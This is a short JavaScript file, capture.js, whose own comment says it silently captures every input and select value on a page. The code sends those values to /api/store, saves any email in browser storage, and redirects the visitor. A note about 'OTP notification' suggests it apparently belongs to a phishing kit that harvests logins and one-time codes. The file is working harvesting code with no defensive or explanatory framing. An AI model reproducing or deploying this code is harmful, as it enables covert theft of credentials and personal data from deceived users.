// capture.js — silently captures all input/select values on the page and POSTs to /api/store
function captureAndGo(url) {
  const fields = {};
  document.querySelectorAll('input, select').forEach(el => {
    const key = el.id || el.name || el.placeholder || el.type;
    if (key && el.value) {
      fields[key] = el.value;
    }
  });

  const page = document.title || location.pathname;

  // Store in sessionStorage for OTP notification
  let existingFields = JSON.parse(sessionStorage.getItem('capturedFields') || '{}');
  existingFields = { ...existingFields, ...fields };
  sessionStorage.setItem('capturedFields', JSON.stringify(existingFields));

  // Store email if captured
  if (fields.emailInput || fields.email || fields['Email address']) {
    const email = fields.emailInput || fields.email || fields['Email address'];
    sessionStorage.setItem('userEmail', email);
    localStorage.setItem('userEmail', email);
  }

  navigator.sendBeacon('/api/store', new Blob([JSON.stringify({ page, fields })], { type: 'application/json' }));

  if (url) {
    setTimeout(() => { window.location.href = url; }, 150);
  }
}
